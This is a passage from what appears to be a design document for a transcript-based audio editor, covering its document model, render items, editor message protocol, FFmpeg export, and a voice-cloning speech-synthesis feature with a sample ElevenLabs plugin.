	return content.map((item, idx) => {
		const timed = { ...item, absoluteStart: absoluteTime, absoluteIndex: idx };
		if ('length' in item) {
			absoluteTime += item.length;
		}
		return timed;
	});
}
```

**Benefits:**

- Edits don't require updating timestamps
- No timestamp inconsistency bugs
- Simpler undo/redo (just restore array)

### RenderItems: The Edit Decision List

For playback and export, the document is converted to **RenderItems**:

```typescript
type RenderItem =
	| {
			type: 'media';
			source: string;
			sourceStart: number;
			length: number;
			absoluteStart: number;
			speaker: string | null;
	  }
	| { type: 'silence'; length: number; absoluteStart: number };

function computeRenderItems(content: DocumentItem[]): RenderItem[] {
	const items: RenderItem[] = [];
	let currentTime = 0;
	let currentSpeaker: string | null = null;
	let current: RenderItem | null = null;

	for (const item of content) {
		if (item.type === 'paragraph_start') {
			currentSpeaker = item.speaker;
		} else if (item.type === 'paragraph_end') {
			// Finalize current render item
			if (current) {
				items.push(current);
				current = null;
			}
		} else if (item.type === 'text' || item.type === 'non_text') {
			// Check if we can merge with previous (consecutive in source)
			if (
				current?.type === 'media' &&
				current.source === item.source &&
				Math.abs(current.sourceStart + current.length - item.sourceStart) < 0.01
			) {
				// Merge: extend current item
				current.length += item.length;
			} else {
				// Start new render item
				if (current) items.push(current);
				current = {
					type: 'media',
					source: item.source,
					sourceStart: item.sourceStart,
					length: item.length,
					absoluteStart: currentTime,
					speaker: currentSpeaker,
				};
			}
			currentTime += item.length;
		} else if (item.type === 'artificial_silence') {
			if (current) {
				items.push(current);
				current = null;
			}
			items.push({
				type: 'silence',
				length: item.length,
				absoluteStart: currentTime,
			});
			currentTime += item.length;
		}
	}

	if (current) items.push(current);
	return items;
}
```

**Merging optimization:** Consecutive words from the same source position become a single render item, reducing FFmpeg operations.

### Editor Actor

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    EDITOR ACTOR TOPOLOGY                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Existing Actors:                                                        â”‚
â”‚  Recorder â”€â”€â–º Transcriber â”€â”€â–º Coordinator                               â”‚
â”‚                                   â”‚                                      â”‚
â”‚                                   â”‚ TRANSCRIPT_FINAL (with segments)     â”‚
â”‚                                   â–¼                                      â”‚
â”‚                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                             â”‚
â”‚                          â”‚  Editor Actor   â”‚  â† NEW                      â”‚
â”‚                          â”‚                 â”‚                             â”‚
â”‚                          â”‚ â€¢ Document stateâ”‚                             â”‚
â”‚                          â”‚ â€¢ Cursor/select â”‚                             â”‚
â”‚                          â”‚ â€¢ Undo stack    â”‚                             â”‚
â”‚                          â”‚ â€¢ Playback ctrl â”‚                             â”‚
â”‚                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             â”‚
â”‚                                   â”‚                                      â”‚
â”‚                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚
â”‚                    â”‚              â”‚              â”‚                       â”‚
â”‚                    â–¼              â–¼              â–¼                       â”‚
â”‚              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
â”‚              â”‚  Player  â”‚  â”‚  FFmpeg  â”‚  â”‚   UI     â”‚                    â”‚
â”‚              â”‚ (preview)â”‚  â”‚ (export) â”‚  â”‚ (render) â”‚                    â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Editor Message Protocol

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DOCUMENT OPERATIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type LoadDocument = {
	type: 'LOAD_DOCUMENT';
	document: EditableDocument;
};

type DocumentLoaded = {
	type: 'DOCUMENT_LOADED';
	document: EditableDocument;
	duration: number;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EDIT OPERATIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type DeleteSelection = {
	type: 'DELETE_SELECTION';
	// Uses current selection state
};

type InsertParagraphBreak = {
	type: 'INSERT_PARAGRAPH_BREAK';
	atIndex: number;
};

type SetSpeaker = {
	type: 'SET_SPEAKER';
	paragraphUuid: string;
	speaker: string;
};

type InsertSilence = {
	type: 'INSERT_SILENCE';
	atIndex: number;
	duration: number;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SELECTION & CURSOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type SetCursor = {
	type: 'SET_CURSOR';
	index: number;
	source: 'user' | 'player';
};

type SetSelection = {
	type: 'SET_SELECTION';
	startIndex: number;
	length: number;
};

type ClearSelection = {
	type: 'CLEAR_SELECTION';
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PLAYBACK
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type Play = { type: 'PLAY' };
type Pause = { type: 'PAUSE' };
type Seek = { type: 'SEEK'; time: number };
type PlaybackTimeUpdate = { type: 'PLAYBACK_TIME_UPDATE'; time: number };

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// UNDO/REDO
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type Undo = { type: 'UNDO' };
type Redo = { type: 'REDO' };

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EXPORT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type ExportRequest = {
	type: 'EXPORT_REQUEST';
	format: 'mp3' | 'wav' | 'mp4' | 'webm';
	selection?: { startIndex: number; length: number }; // or whole doc
	includeSubtitles?: boolean;
};

type ExportProgress = {
	type: 'EXPORT_PROGRESS';
	progress: number; // 0-1
};

type ExportComplete = {
	type: 'EXPORT_COMPLETE';
	outputPath: string;
};
```

### Editor State

```typescript
interface EditorState {
	// Document
	document: EditableDocument;

	// Cursor (two modes like Audapolis)
	cursor: {
		userIndex: number; // User-placed cursor position
		playerTime: number; // Playback position
		current: 'user' | 'player';
	};

	// Selection
	selection: {
		startIndex: number;
		length: number;
		headPosition: 'left' | 'right'; // For shift+arrow
	} | null;

	// Playback
	playing: boolean;

	// Undo stack
	undoStack: EditableDocument[];
	redoStack: EditableDocument[];

	// Export
	exportState: {
		running: boolean;
		progress: number;
	};
}
```

### FFmpeg Export Pipeline

```typescript
async function exportAudio(
	renderItems: RenderItem[],
	sources: Record<string, Source>,
	outputPath: string,
	onProgress: (p: number) => void,
): Promise<void> {
	const tempDir = await createTempDir();

	// Create FFmpeg inputs for each render item
	const inputs = renderItems.map((item, i) => {
		if (item.type === 'media') {
			const sourcePath = path.join(tempDir, `source_${item.source}`);
			await writeFile(sourcePath, sources[item.source].blob);

			return {
				path: sourcePath,
				options: {
					ss: item.sourceStart.toString(), // Start time
					t: item.length.toString(), // Duration
				},
			};
		} else {
			// Generate silence with FFmpeg filter
			return {
				filter: 'anullsrc',
				options: { duration: item.length },
			};
		}
	});

	// Concatenate all segments
	await ffmpegConcat(inputs, outputPath, onProgress);

	await cleanupTempDir(tempDir);
}
```

### Transcription Integration

The transcription service must return word-level timestamps:

```typescript
// Enhanced TranscriptFinal (updates Section 15)
type TranscriptFinal = {
	type: 'TRANSCRIPT_FINAL';
	sessionId: string;
	text: string; // Plain text for display/copy
	segments: TranscriptSegment[]; // Word-level data for editing
	sourceId: string; // Reference to stored audio
};

type TranscriptSegment = {
	word: string;
	start: number; // Start time in source
	end: number; // End time in source
	confidence: number;
	type: 'word' | 'punctuation' | 'non_speech';
};

// Conversion to document items
function transcriptToDocument(
	transcript: TranscriptFinal,
	speaker: string,
): DocumentItem[] {
	const items: DocumentItem[] = [
		{ type: 'paragraph_start', speaker, language: null, uuid: nanoid() },
	];

	for (const segment of transcript.segments) {
		if (segment.type === 'word') {
			items.push({
				type: 'text',
				uuid: nanoid(),
				source: transcript.sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
				text: segment.word,
				conf: segment.confidence,
			});
		} else if (segment.type === 'non_speech') {
			items.push({
				type: 'non_text',
				uuid: nanoid(),
				source: transcript.sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
			});
		}
	}

	items.push({ type: 'paragraph_end', uuid: nanoid() });
	return items;
}
```

### File Format

Documents saved as ZIP (like Audapolis):

```
recording.audapolis (ZIP)
â”œâ”€â”€ document.json          # Document structure
â”œâ”€â”€ metadata.json          # Display settings, version
â””â”€â”€ sources/
    â”œâ”€â”€ abc123             # Original audio (by hash)
    â”œâ”€â”€ def456             # Another source
    â””â”€â”€ gen_xyz789         # Generated audio (Section 17)
```

Benefits:

- **Non-destructive:** Original media always preserved
- **Portable:** Single file contains everything
- **Efficient:** Sources stored once, referenced many times

---

## Generative Audio Insertion (AI Voice Synthesis)

### Overview

Generative audio insertion allows users to add or modify spoken words using AI-generated speech. Edit the transcript text beyond what was originally spoken, and AI synthesizes the new audio in the speaker's voice.

```
Original: "Hello my name is Claude and I love coding"
                                              â†“
User edits: "Hello my name is Claude and I love Svelte"
                                                 â†‘
                                         No source audio exists!
                                              â†“
AI generates: Voice clone speaks "Svelte" â†’ new audio segment
                                              â†“
Final: Original audio seamlessly spliced with AI "Svelte"
```

### New Document Item Type

```typescript
interface GeneratedTextItem {
	type: 'generated_text';
	uuid: string;
	text: string;

	// Voice configuration
	voice: string; // Voice ID or clone reference
	style?: string; // "neutral", "excited", "sad", etc.

	// Generated audio (populated after synthesis)
	generatedSource?: string; // Hash of generated audio blob
	length?: number; // Duration (known after generation)

	// Status tracking
	status: 'pending' | 'generating' | 'generated' | 'failed';
	error?: string; // Error message if failed
}
```

### Updated Document Model

```typescript
type DocumentItem =
	| ParagraphStartItem
	| ParagraphEndItem
	| TextItem
	| NonTextItem
	| ArtificialSilenceItem
	| GeneratedTextItem; // â† NEW
```

### Visual Representation

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  DOCUMENT TIMELINE WITH GENERATED TEXT                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚Hello â”‚  my  â”‚ name â”‚  is  â”‚Claudeâ”‚  and   â”‚ I love                â”‚  â”‚
â”‚  â”‚ SRC  â”‚ SRC  â”‚ SRC  â”‚ SRC  â”‚ SRC  â”‚  SRC   â”‚ SRC                   â”‚  â”‚
â”‚  â”‚ 0.3s â”‚ 0.2s â”‚ 0.3s â”‚ 0.2s â”‚ 0.4s â”‚  0.3s  â”‚ 0.4s                  â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                            â”‚
â”‚  â”‚  Svelte  â”‚  type: 'generated_text'                                   â”‚
â”‚  â”‚   GEN    â”‚  status: 'pending' â†’ 'generating' â†’ 'generated'           â”‚
â”‚  â”‚   0.4s   â”‚  (duration estimated, then actual after synthesis)        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                            â”‚
â”‚       â†‘                                                                  â”‚
â”‚       â”‚ UI indicator: different background, âš¡ icon                      â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Voice Synthesizer Actor

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    VOICE SYNTH ACTOR TOPOLOGY                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  Editor Actor                                                            â”‚
â”‚       â”‚                                                                  â”‚
â”‚       â”‚ SYNTHESIZE_REQUEST                                               â”‚
â”‚       â–¼                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                             â”‚
â”‚  â”‚         Voice Synthesizer Actor          â”‚                            â”‚
â”‚  â”‚                                          â”‚                            â”‚
â”‚  â”‚  â€¢ Manages TTS provider plugins          â”‚                            â”‚
â”‚  â”‚  â€¢ Handles voice cloning                 â”‚                            â”‚
â”‚  â”‚  â€¢ Caches generated audio                â”‚                            â”‚
â”‚  â”‚  â€¢ Queues synthesis requests             â”‚                            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             â”‚
â”‚                     â”‚                                                    â”‚
â”‚        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                       â”‚
â”‚        â–¼            â–¼            â–¼                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                  â”‚
â”‚  â”‚ElevenLabsâ”‚ â”‚  PlayHT  â”‚ â”‚  Local   â”‚  â† TTS Provider Plugins          â”‚
â”‚  â”‚ Plugin   â”‚ â”‚  Plugin  â”‚ â”‚  (Coqui) â”‚    (Tier 1: sandboxed iframe)    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                  â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Voice Synth Message Protocol

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EDITOR â†’ VOICE SYNTH
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type SynthesizeRequest = {
	type: 'SYNTHESIZE_REQUEST';
	itemUuid: string; // Which generated_text item
	text: string; // What to synthesize
	voice: string; // Voice ID or clone ID
	style?: string; // Emotion/style hint
	context?: {
		precedingText?: string; // For better prosody
		followingText?: string;
		precedingAudio?: Blob; // For voice matching
	};
};

type CloneVoiceRequest = {
	type: 'CLONE_VOICE_REQUEST';
	speaker: string; // Speaker name
	samples: Blob[]; // Audio samples (30+ seconds recommended)
	language?: string;
};

type CancelSynthesis = {
	type: 'CANCEL_SYNTHESIS';
	itemUuid: string;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// VOICE SYNTH â†’ EDITOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type SynthesisProgress = {
	type: 'SYNTHESIS_PROGRESS';
	itemUuid: string;
	progress: number; // 0-1
};

type SynthesisComplete = {
	type: 'SYNTHESIS_COMPLETE';
	itemUuid: string;
	audioBlob: Blob;
	duration: number;
	sourceId: string; // Hash for storage
};

type SynthesisFailed = {
	type: 'SYNTHESIS_FAILED';
	itemUuid: string;
	error: string;
	retryable: boolean;
};

type VoiceCloneComplete = {
	type: 'VOICE_CLONE_COMPLETE';
	speaker: string;
	voiceId: string; // Provider's voice ID
	provider: string; // Which TTS provider
};

type VoiceCloneFailed = {
	type: 'VOICE_CLONE_FAILED';
	speaker: string;
	error: string;
};
```

### TTS Provider Plugin Interface

```typescript
// Plugin manifest
{
  "id": "tts-elevenlabs",
  "name": "ElevenLabs Voice Synthesis",
  "capabilities": {
    "network": ["api.elevenlabs.io"],
    "voice:synthesize": true,
    "voice:clone": true
  },
  "provides": {
    "voiceSynthServices": [{
      "id": "elevenlabs",
      "name": "ElevenLabs",
      "features": ["clone", "multilingual", "styles", "streaming"]
    }]
  }
}

// Plugin implementation
definePlugin({
  // Synthesize speech
  async synthesize(request: {
    text: string;
    voiceId: string;
    style?: string;
    apiKey: string;
  }): Promise<{ audio: Blob; duration: number }> {
    const response = await fetch(
      `https://api.elevenlabs.io/v1/text-to-speech/${request.voiceId}`,
      {
        method: 'POST',
        headers: {
          'xi-api-key': request.apiKey,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          text: request.text,
          model_id: 'eleven_multilingual_v2',
          voice_settings: {
            stability: 0.5,
            similarity_boost: 0.75,
            style: request.style === 'excited' ? 0.8 : 0.5
          }
        })
      }
    );

    const audio = await response.blob();
    const duration = await getAudioDuration(audio);
    return { audio, duration };
  },

  // Clone a voice from samples
  async cloneVoice(request: {
    name: string;
    samples: Blob[];
    apiKey: string;
  }): Promise<{ voiceId: string }> {
    const formData = new FormData();
    formData.append('name', request.name);
    request.samples.forEach((sample, i) => {
      formData.append('files', sample, `sample_${i}.wav`);
    });

    const response = await fetch(
      'https://api.elevenlabs.io/v1/voices/add',
      {
        method: 'POST',
        headers: { 'xi-api-key': request.apiKey },
        body: formData
      }
    );

    const data = await response.json();
    return { voiceId: data.voice_id };
  },

  // List available voices (stock + cloned)
  async listVoices(apiKey: string): Promise<Voice[]> {
    // ...
  }
});
```

### Available TTS Providers

| Provider        | Voice Cloning | Quality   | Latency | Price | Local Option |
| --------------- | ------------- | --------- | ------- | ----- | ------------ |
| **ElevenLabs**  | Yes (instant) | Excellent | ~1-2s   | $$    | No           |
| **PlayHT**      | Yes           | Very Good | ~2-3s   | $$    | No           |
| **Resemble.AI** | Yes           | Very Good | ~2s     | $$    | No           |
| **OpenAI TTS**  | No (stock)    | Excellent | ~1s     | $     | No           |
| **Coqui XTTS**  | Yes           | Good      | ~5s     | Free  | **Yes**      |
| **Piper**       | No (stock)    | Good      | <1s     | Free  | **Yes**      |

### Voice Cloning Workflow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    VOICE CLONING WORKFLOW                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  1. USER RECORDS/IMPORTS AUDIO                                          â”‚
â”‚     â€¢ Transcription generates word-level timestamps                     â”‚
â”‚     â€¢ Speaker identified (manual or diarization)                        â”‚
â”‚                                                                          â”‚
â”‚  2. AUTOMATIC SAMPLE EXTRACTION                                         â”‚
â”‚     â€¢ System identifies clean speech segments                           â”‚
â”‚     â€¢ Filters out: noise, overlapping speech, music                     â”‚
â”‚     â€¢ Collects 30+ seconds of good samples                              â”‚
â”‚                                                                          â”‚
â”‚  3. VOICE CLONE CREATION (user-initiated)                               â”‚
â”‚     â€¢ User clicks "Clone Voice" for speaker                             â”‚
â”‚     â€¢ Samples sent to TTS provider                                      â”‚
â”‚     â€¢ Returns voice_id stored in document:                              â”‚
â”‚       speakers['Alice'].voiceCloneId = 'voice_abc123'                   â”‚
â”‚                                                                          â”‚
â”‚  4. USER EDITS TEXT                                                      â”‚
â”‚     â€¢ System detects new/modified words                                 â”‚
â”‚     â€¢ Creates generated_text items with status: 'pending'               â”‚
â”‚     â€¢ UI shows "Generate" button or auto-generates                      â”‚
â”‚                                                                          â”‚
â”‚  5. SYNTHESIS                                                            â”‚
â”‚     â€¢ Voice Synth Actor processes queue                                 â”‚
â”‚     â€¢ Calls TTS plugin with cloned voice                                â”‚
â”‚     â€¢ Updates document with generated audio                             â”‚
â”‚                                                                          â”‚
â”‚  6. PLAYBACK/EXPORT                                                      â”‚
â”‚     â€¢ Generated audio treated as regular source                         â”‚
â”‚     â€¢ Seamless playback with original audio                             â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### RenderItems with Generated Audio

```typescript
function computeRenderItems(content: DocumentItem[]): RenderItem[] {
	const items: RenderItem[] = [];
	let currentTime = 0;

	for (const item of content) {
		if (item.type === 'text' || item.type === 'non_text') {
			// Original audio - unchanged
			items.push({
				type: 'media',
				source: item.source,
				sourceStart: item.sourceStart,
				length: item.length,
				absoluteStart: currentTime,
			});
			currentTime += item.length;
		} else if (item.type === 'generated_text') {
			if (item.status === 'generated' && item.generatedSource) {
				// AI-generated audio (treat same as regular media)
				items.push({
					type: 'media',
					source: item.generatedSource,
					sourceStart: 0, // Generated audio starts at 0
					length: item.length!,
					absoluteStart: currentTime,
				});
				currentTime += item.length!;
			} else {
				// Not yet generated - render as silence placeholder
				const estimatedLength = estimateDuration(item.text);
				items.push({
					type: 'silence',
					length: estimatedLength,
					absoluteStart: currentTime,
				});
